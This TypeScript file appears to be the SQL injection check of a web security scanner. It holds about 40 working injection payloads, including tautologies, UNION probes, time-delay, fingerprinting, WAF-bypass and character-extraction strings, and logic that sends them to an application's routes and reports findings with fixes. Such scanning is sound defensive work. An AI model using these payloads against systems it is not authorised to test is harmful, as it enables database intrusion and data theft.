import { Check, Finding } from "../core/types.js";

// Comprehensive SQL injection payload library (40+ payloads)
const SQL_PAYLOADS = [
  // ===== Error-Based Detection =====
  {
    name: "Quote Break",
    value: "test'",
    category: "error-based",
    markers: ["syntax", "sql", "mysql", "postgres", "sqlite", "unclosed"],
  },
  {
    name: "Double Quote Break",
    value: 'test"',
    category: "error-based",
    markers: ["syntax", "error", "unexpected"],
  },
  {
    name: "Comment Injection",
    value: "test'--",
    category: "error-based",
    markers: ["syntax", "error", "unclosed"],
  },
  {
    name: "Hash Comment",
    value: "test'#",
    category: "error-based",
    markers: ["syntax", "error"],
  },
  {
    name: "Quote Escape",
    value: "test\\'",
    category: "error-based",
    markers: ["escape", "backslash"],
  },
  {
    name: "Parenthesis Break",
    value: "test')",
    category: "error-based",
    markers: ["syntax", "unmatched", "parenthesis"],
  },

  // ===== Boolean-Based Blind =====
  {
    name: "Boolean OR True",
    value: "1' OR '1'='1",
    category: "boolean-blind",
    markers: [],
  },
  {
    name: "Boolean AND True",
    value: "1' AND '1'='1",
    category: "boolean-blind",
    markers: [],
  },
  {
    name: "Boolean OR False",
    value: "1' OR '1'='2",
    category: "boolean-blind",
    markers: [],
  },
  {
    name: "Tautology",
    value: "admin' OR 1=1--",
    category: "boolean-blind",
    markers: [],
  },
  {
    name: "Double Dash Comment",
    value: "admin'-- ",
    category: "boolean-blind",
    markers: [],
  },

  // ===== Union-Based =====
  {
    name: "Union Select NULL",
    value: "1' UNION SELECT NULL--",
    category: "union-based",
    markers: ["union", "syntax", "column"],
  },
  {
    name: "Union Select NULL x2",
    value: "1' UNION SELECT NULL,NULL--",
    category: "union-based",
    markers: ["union", "column"],
  },
  {
    name: "Union Select NULL x3",
    value: "1' UNION SELECT NULL,NULL,NULL--",
    category: "union-based",
    markers: ["union", "column"],
  },
  {
    name: "Union All",
    value: "1' UNION ALL SELECT NULL--",
    category: "union-based",
    markers: ["union"],
  },

  // ===== Time-Based Blind (Database-Specific) =====
  {
    name: "MySQL Time Delay",
    value: "1' AND SLEEP(3)--",
    category: "time-based",
    dbType: "mysql",
    markers: [],
  },
  {
    name: "PostgreSQL Time Delay",
    value: "1'; SELECT pg_sleep(3)--",
    category: "time-based",
    dbType: "postgresql",
    markers: [],
  },
  {
    name: "MSSQL Time Delay",
    value: "1'; WAITFOR DELAY '00:00:03'--",
    category: "time-based",
    dbType: "mssql",
    markers: [],
  },
  {
    name: "SQLite Time Delay",
    value: "1' AND randomblob(100000000)--",
    category: "time-based",
    dbType: "sqlite",
    markers: [],
  },
  {
    name: "MySQL Benchmark",
    value: "1' AND BENCHMARK(5000000,SHA1('test'))--",
    category: "time-based",
    dbType: "mysql",
    markers: [],
  },

  // ===== Database Fingerprinting =====
  {
    name: "MySQL Version",
    value: "1' AND @@version--",
    category: "fingerprint",
    dbType: "mysql",
    markers: ["mysql", "mariadb", "version"],
  },
  {
    name: "PostgreSQL Version",
    value: "1' AND version()--",
    category: "fingerprint",
    dbType: "postgresql",
    markers: ["postgresql", "postgres"],
  },
  {
    name: "MSSQL Version",
    value: "1' AND @@version--",
    category: "fingerprint",
    dbType: "mssql",
    markers: ["microsoft", "sql server"],
  },
  {
    name: "SQLite Version",
    value: "1' AND sqlite_version()--",
    category: "fingerprint",
    dbType: "sqlite",
    markers: ["sqlite"],
  },
  {
    name: "Oracle Version",
    value: "1' AND banner FROM v$version WHERE banner LIKE 'Oracle%'--",
    category: "fingerprint",
    dbType: "oracle",
    markers: ["oracle"],
  },

  // ===== Stacked Queries (Safe) =====
  {
    name: "Stacked Query Safe",
    value: "1'; SELECT 1--",
    category: "stacked",
    markers: ["stacked", "multi-statement"],
  },
  {
    name: "Semicolon Stacked",
    value: "test'; SELECT CURRENT_TIMESTAMP--",
    category: "stacked",
    markers: [],
  },

  // ===== Encoding Bypasses =====
  {
    name: "URL Encoded Quote",
    value: "test%27",
    category: "encoding",
    markers: ["syntax"],
  },
  {
    name: "Double URL Encoded",
    value: "test%2527",
    category: "encoding",
    markers: ["syntax"],
  },
  {
    name: "Unicode Quote",
    value: "test\u0027",
    category: "encoding",
    markers: ["syntax"],
  },
  {
    name: "Hex Encoded",
    value: "0x74657374",
    category: "encoding",
    markers: [],
  },
  {
    name: "Case Variation",
    value: "1' oR '1'='1",
    category: "encoding",
    markers: [],
  },

  // ===== WAF Bypass =====
  {
    name: "Comment Obfuscation",
    value: "1'/**/OR/**/1=1--",
    category: "waf-bypass",
    markers: [],
  },
  {
    name: "Newline Injection",
    value: "1'\nOR\n1=1--",
    category: "waf-bypass",
    markers: [],
  },
  {
    name: "Tab Injection",
    value: "1'\tOR\t1=1--",
    category: "waf-bypass",
    markers: [],
  },
  {
    name: "Mixed Case OR",
    value: "1' Or 1=1--",
    category: "waf-bypass",
    markers: [],
  },
  {
    name: "Parenthesis Bypass",
    value: "1'||(SELECT 1)||'",
    category: "waf-bypass",
    markers: [],
  },
  {
    name: "Concatenation Bypass",
    value: "1'||'1'='1",
    category: "waf-bypass",
    markers: [],
  },

  // ===== Advanced Techniques =====
  {
    name: "Conditional Response",
    value: "1' AND (SELECT COUNT(*) FROM users)>0--",
    category: "advanced",
    markers: [],
  },
  {
    name: "Substring Extraction",
    value: "1' AND SUBSTRING(version(),1,1)='5'--",
    category: "advanced",
    markers: [],
  },
  {
    name: "ASCII Comparison",
    value: "1' AND ASCII(SUBSTRING((SELECT database()),1,1))>97--",
    category: "advanced",
    markers: [],
  },
];

const SQL_FIELD_PATTERNS = [
  "search",
  "query",
  "q",
  "filter",
  "sort",
  "order",
  "id",
  "user_id",
  "username",
  "email",
  "name",
  "category",
  "tag",
  "status",
  "type",
];

// Helper: Measure response time for baseline comparison
async function measureResponseTime(
  client: any,
  route: any,
  field: string,
  value: string,
): Promise<number> {
  const startTime = Date.now();
  try {
    if (route.method === "GET") {
      await client.get(route.path, {
        params: { [field]: value },
        validateStatus: () => true,
        timeout: 10000,
      });
    } else {
      await client.request({
        method: route.method,
        url: route.path,
        data: { [field]: value },
        validateStatus: () => true,
        timeout: 10000,
      });
    }
  } catch (e) {
    // Ignore errors for timing measurement
  }
  return Date.now() - startTime;
}

export const sqlInjectionCheck: Check = {
  id: "sql-injection",
  name: "SQL Injection (CWE-89)",
  description:
    "Comprehensive SQL injection detection with 40+ payloads, database fingerprinting, and time-based blind detection",
  async run({ axios, apiAxios, discoveredRoutes }) {
    const findings: Finding[] = [];
    const detectedDatabases = new Set<string>();

    // Test both GET (query params) and POST (body params)
    const candidates = discoveredRoutes.filter(
      (r) =>
        r.path.includes("search") ||
        r.path.includes("filter") ||
        r.path.includes("list") ||
        r.path.includes("query") ||
        (r.inputs &&
          Object.keys(r.inputs).some((k) =>
            SQL_FIELD_PATTERNS.some((pattern) =>
              k.toLowerCase().includes(pattern),
            ),
          )),
    );

    for (const route of candidates) {
      const client = route.path.startsWith("/api") ? apiAxios : axios;

      // Determine which fields to test
      let testFields: string[] = [];
      if (route.inputs) {
        testFields = Object.keys(route.inputs).filter((k) =>
          SQL_FIELD_PATTERNS.some((pattern) =>
            k.toLowerCase().includes(pattern),
          ),
        );
      }
      if (testFields.length === 0) {
        testFields = ["search", "q", "filter", "id", "sort"];
      }

      for (const field of testFields) {
        // Establish baseline response time for time-based detection
        let baselineTime = 0;
        try {
          baselineTime = await measureResponseTime(
            client,
            route,
            field,
            "normalValue123",
          );
        } catch (e) {
          continue;
        }

        for (const payload of SQL_PAYLOADS) {
          try {
            const startTime = Date.now();

            let res;
            if (route.method === "GET") {
              res = await client.get(route.path, {
                params: { [field]: payload.value },
                validateStatus: () => true,
                timeout: 12000,
              });
            } else {
              res = await client.request({
                method: route.method,
                url: route.path,
                data: { [field]: payload.value },
                validateStatus: () => true,
                timeout: 12000,
              });
            }

            const responseTime = Date.now() - startTime;
            const bodyStr = JSON.stringify(res.data).toLowerCase();
            const headersStr = JSON.stringify(res.headers).toLowerCase();

            // Detection 1: SQL error messages in response
            const hasErrorMarker = payload.markers.some(
              (marker) =>
                bodyStr.includes(marker) || headersStr.includes(marker),
            );

            if (hasErrorMarker && (res.status === 500 || res.status === 400)) {
              findings.push({
                id: `sql-injection-error-${route.path}-${field}-${payload.name.replace(/\s/g, "-")}`,
                checkId: "sql-injection",
                category: "backend",
                name: `SQL Injection - Error-Based (${payload.category})`,
                endpoint: `${route.method} ${route.path}`,
                risk: "critical",
                description: `Field '${field}' with ${payload.category} payload "${payload.value}" triggered SQL error patterns in response. This indicates raw SQL query construction.`,
                assumption:
                  "ORM usage means SQL injection is impossible, or raw queries are properly parameterized.",
                reproduction: `curl -X ${route.method} "${client.defaults.baseURL}${route.path}${route.method === "GET" ? `?${field}=${encodeURIComponent(payload.value)}` : ""}" ${route.method !== "GET" ? `-d '{"${field}":"${payload.value}"}' -H "Content-Type: application/json"` : ""}`,
                fix: "Use parameterized queries or ORM methods. Never concatenate user input into SQL strings. Example: Use db.query('SELECT * FROM users WHERE id = ?', [userId]) instead of db.query(`SELECT * FROM users WHERE id = ${userId}`).",
              });
              break; // One finding per field is enough
            }

            // Detection 2: Database fingerprinting
            if (payload.category === "fingerprint" && payload.dbType) {
              const dbMarkers = payload.markers;
              const hasDbIndicator = dbMarkers.some(
                (marker) =>
                  bodyStr.includes(marker) || headersStr.includes(marker),
              );

              if (hasDbIndicator && (res.status === 500 || res.status === 200)) {
                detectedDatabases.add(payload.dbType);
                findings.push({
                  id: `sql-injection-fingerprint-${route.path}-${field}-${payload.dbType}`,
                  checkId: "sql-injection",
                  category: "backend",
                  name: `Database Fingerprinted: ${payload.dbType.toUpperCase()}`,
                  endpoint: `${route.method} ${route.path}`,
                  risk: "high",
                  description: `Field '${field}' revealed database type: ${payload.dbType.toUpperCase()}. The application is vulnerable to SQL injection and database type is now known to attackers.`,
                  assumption: "Database type and version should not be exposed.",
                  reproduction: `Payload revealed DB: ${payload.value}`,
                  fix: "Fix SQL injection vulnerability. Additionally, configure database error messages to be generic in production.",
                });
              }
            }

            // Detection 3: Response shape changes (boolean-based blind)
            if (payload.category === "boolean-blind" && res.status === 200) {
              const hasExtraData =
                res.data &&
                ((Array.isArray(res.data) && res.data.length > 100) ||
                  (typeof res.data === "object" &&
                    Object.keys(res.data).length > 20));

              if (hasExtraData) {
                findings.push({
                  id: `sql-injection-blind-${route.path}-${field}`,
                  checkId: "sql-injection",
                  category: "backend",
                  name: "SQL Injection - Blind/Boolean-Based",
                  endpoint: `${route.method} ${route.path}`,
                  risk: "critical",
                  description: `Field '${field}' with boolean injection returned unexpected data volume, suggesting query manipulation.`,
                  assumption:
                    "Input validation and ORM prevent query manipulation.",
                  reproduction: `Test with: ${field}=${payload.value}`,
                  fix: "Implement strict input validation and use parameterized queries exclusively.",
                });
                break;
              }
            }

            // Detection 4: Time-based blind (FIXED: actual delay detection)
            if (payload.category === "time-based") {
              const timeDiff = responseTime - baselineTime;

              // If response took 2.5+ seconds longer than baseline, likely SQL delay
              if (timeDiff >= 2500 && responseTime >= 2500) {
                const dbInfo = payload.dbType
                  ? ` (${payload.dbType.toUpperCase()})`
                  : "";
                findings.push({
                  id: `sql-injection-time-${route.path}-${field}-${payload.dbType || "generic"}`,
                  checkId: "sql-injection",
                  category: "backend",
                  name: `SQL Injection - Time-Based Blind${dbInfo}`,
                  endpoint: `${route.method} ${route.path}`,
                  risk: "critical",
                  description: `Field '${field}' caused ${responseTime}ms delay (baseline: ${baselineTime}ms) with time-based payload, indicating SQL execution${dbInfo}. This is a confirmed SQL injection vulnerability.`,
                  assumption: "Backend properly sanitizes all user input.",
                  reproduction: `Time anomaly detected with payload: ${payload.value}`,
                  fix: "Use parameterized queries. Disable dangerous SQL functions like SLEEP/WAITFOR in database permissions if possible.",
                });

                if (payload.dbType) {
                  detectedDatabases.add(payload.dbType);
                }
                break;
              }
            }

            // Detection 5: Stacked query detection
            if (payload.category === "stacked" && res.status !== 404) {
              // If stacked query doesn't cause error, it might be executed
              if (res.status === 200 || res.status === 500) {
                findings.push({
                  id: `sql-injection-stacked-${route.path}-${field}`,
                  checkId: "sql-injection",
                  category: "backend",
                  name: "SQL Injection - Stacked Queries",
                  endpoint: `${route.method} ${route.path}`,
                  risk: "critical",
                  description: `Field '${field}' accepted stacked query syntax. This allows multiple SQL statements in a single query.`,
                  assumption: "Database prevents stacked queries from user input.",
                  reproduction: `Payload: ${payload.value}`,
                  fix: "Use parameterized queries and ensure database connection doesn't allow stacked queries.",
                });
              }
            }
          } catch (e: any) {
            // Detection 6: Exception-based detection
            if (
              e.message &&
              (e.message.toLowerCase().includes("sql") ||
                e.message.toLowerCase().includes("syntax") ||
                e.message.toLowerCase().includes("query"))
            ) {
              findings.push({
                id: `sql-injection-exception-${route.path}-${field}`,
                checkId: "sql-injection",
                category: "backend",
                name: "SQL Injection - Exception-Based",
                endpoint: `${route.method} ${route.path}`,
                risk: "critical",
                description: `Field '${field}' caused SQL-related exception: ${e.message.substring(0, 200)}`,
                assumption: "Error handling prevents information leakage.",
                reproduction: `Exception triggered with field: ${field}`,
                fix: "Implement proper error handling and use parameterized queries.",
              });
            }

            // Timeout might indicate hung query
            if (e.code === "ECONNABORTED" || e.message?.includes("timeout")) {
              if (payload.category === "time-based") {
                findings.push({
                  id: `sql-injection-timeout-${route.path}-${field}`,
                  checkId: "sql-injection",
                  category: "backend",
                  name: "SQL Injection - Timeout (Time-Based)",
                  endpoint: `${route.method} ${route.path}`,
                  risk: "critical",
                  description: `Field '${field}' caused request timeout with time-based payload. This confirms SQL injection vulnerability.`,
                  assumption: "Requests complete in reasonable time.",
                  reproduction: `Timeout with payload: ${payload.value}`,
                  fix: "Use parameterized queries immediately. This is a confirmed vulnerability.",
                });
              }
            }
          }
        }
      }
    }

    // Summary: Report detected database types
    if (detectedDatabases.size > 0) {
      findings.push({
        id: "sql-injection-summary-databases",
        checkId: "sql-injection",
        category: "backend",
        name: "Database Types Detected",
        endpoint: "Summary",
        risk: "medium",
        description: `Detected database types: ${Array.from(detectedDatabases).map((db) => db.toUpperCase()).join(", ")}. This information helps attackers craft targeted SQL injection payloads.`,
        assumption: "Database type should not be exposed to attackers.",
        reproduction: "Database fingerprinting via SQL injection payloads",
        fix: "Fix all SQL injection vulnerabilities. Configure generic error messages in production.",
      });
    }

    return findings;
  },
};
